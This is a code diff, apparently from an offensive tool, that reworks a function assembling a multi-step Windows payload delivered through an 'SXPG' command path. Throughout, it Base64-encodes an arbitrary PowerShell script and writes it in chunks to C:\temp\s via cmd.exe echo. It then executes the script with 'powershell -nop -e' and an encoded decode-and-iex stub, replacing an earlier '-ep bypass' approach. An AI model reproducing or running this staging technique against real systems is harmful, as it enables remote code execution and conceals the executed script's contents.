@@ -405,27 +405,37 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
                f"[Convert]::FromBase64String($b)))\"")
     assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
 
-    # SXPG path: write PS1 directly using cmd.exe echo.
-    # Escape cmd.exe special chars: & | < > ( ) ^ with ^
-    escaped = ps_script
-    for ch in ("^", "&", "|", "<", ">", "(", ")"):
-        escaped = escaped.replace(ch, f"^{ch}")
-    # Split into chunks that fit in PARAMS (255 chars).
-    # "cmd.exe" EXTPROG + "/C echo CHUNK>>path" PARAMS
-    # Overhead: "/C echo >>" + path = ~30 chars
-    ps_chunk_size = 200
-    ps_chunks = [escaped[i:i+ps_chunk_size]
-                 for i in range(0, len(escaped), ps_chunk_size)]
-    ps1_file = f"{tmp}.ps1"
+    # SXPG path: write ASCII Base64 chunks, decode+exec via
+    # PowerShell -EncodedCommand (which encodes the DECODE script).
+    # SXPG splits PARAMS at spaces but -e <base64> is just 2 tokens.
+    # Use C:\temp for short path (fits in 255-char PARAMS).
+    sxpg_tmp = r"C:\temp\s"
+    enc_ascii = base64.b64encode(
+        ps_script.encode("ascii")).decode("ascii")
+    sxpg_chunks = [enc_ascii[i:i+chunk_size]
+                   for i in range(0, len(enc_ascii), chunk_size)]
+    # Build the decode+exec script, then encode IT for -e
+    decode_script = (f"iex([Text.Encoding]::ASCII.GetString("
+                     f"[Convert]::FromBase64String("
+                     f"-join(gc '{sxpg_tmp}'))))")
+    decode_enc = base64.b64encode(
+        decode_script.encode("utf-16-le")).decode("ascii")
+    sxpg_params = f"-nop -e {decode_enc}"
+    assert len(sxpg_params) <= 255, (
+        f"SXPG params too long: {len(sxpg_params)}")
+
     sxpg_steps = [
+        # Create C:\temp if it doesn't exist, clean old files
         {"command": "cmd.exe",
-         "params": f"/C del /q {ps1_file} 2>nul"},
+         "params": f"/C mkdir {sxpg_tmp[:7]} 2>nul"},
+        {"command": "cmd.exe",
+         "params": f"/C del /q {sxpg_tmp} 2>nul"},
     ]
-    for idx, chunk in enumerate(ps_chunks):
+    for idx, chunk in enumerate(sxpg_chunks):
         redir = ">" if idx == 0 else ">>"
         sxpg_steps.append({
             "command": "cmd.exe",
-            "params": f"/C echo {chunk}{redir}{ps1_file}",
+            "params": f"/C echo {chunk}{redir}{sxpg_tmp}",
         })
     return {
         "steps": steps,
@@ -433,7 +443,7 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
         "params": "",
         "sxpg_steps": sxpg_steps,
         "sxpg_command": "powershell.exe",
-        "sxpg_params": f"-nop -ep bypass -f {ps1_file}",
+        "sxpg_params": sxpg_params,
         "display": display,
     }
 
